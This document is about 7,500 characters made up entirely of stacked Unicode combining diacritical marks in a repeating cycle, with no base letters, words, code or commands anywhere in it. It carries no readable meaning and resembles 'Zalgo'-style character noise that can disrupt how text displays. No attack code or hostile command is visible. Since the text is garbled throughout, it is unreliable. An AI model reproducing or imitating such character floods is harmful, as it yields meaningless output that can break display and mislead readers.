̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̈́͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̈́͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽